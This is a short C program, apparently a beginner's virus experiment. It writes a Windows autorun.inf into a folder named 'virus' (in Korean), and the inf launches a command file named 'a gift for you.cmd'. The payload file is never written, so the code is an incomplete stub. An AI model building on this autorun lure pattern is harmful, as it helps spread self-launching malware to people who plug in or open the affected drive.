#include <stdio.h>

int main()
{
	FILE *fp1 = fopen("C:/Users/dsm2017/Desktop/바이러스/autorun.inf", "w");
	FILE *fp2 = fopen("C:/Users/dsm2017/Desktop/바이러스/autorun.bac", "w");

	fprintf(fp1, "[Autorun]\n");
	fprintf(fp1, "open=당신을 위한 선물.cmd\n");
	fclose(fp1);
	
	fprintf(fp2, "-------------------------------------------\n");
	fprintf(fp2, "-------------------------------------------\n");
	fclose(fp2);
	return 0;
} 
